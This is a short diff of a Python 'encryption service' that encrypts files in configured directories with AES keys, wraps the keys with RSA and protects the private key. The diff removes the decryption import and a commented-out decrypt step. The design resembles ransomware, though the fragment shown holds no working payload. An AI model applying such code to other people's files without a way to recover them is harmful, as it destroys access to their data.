@@ -2,7 +2,6 @@ import yaml
 
 from key_generation import generate_keys_aes, generate_rsa_key
 from encrypt import encrypt_files, encrypt_aes_keys, protect_private_key
-from decrypt import decrypt_files
 from sign_and_verify import sign_aes_keys, verify_aes_keys
 
 
@@ -41,10 +40,6 @@ def start_service():
     # encrypt files with AES keys
     encrypt_files(key_dict, config['directories'])
     print('Files encrypted')
-
-    # uncomment to decrypt files
-    # decrypt_files(key_dict, config['directories'])
-    # print('Files decrypted')
 
     print('Encryption service stopped')
 
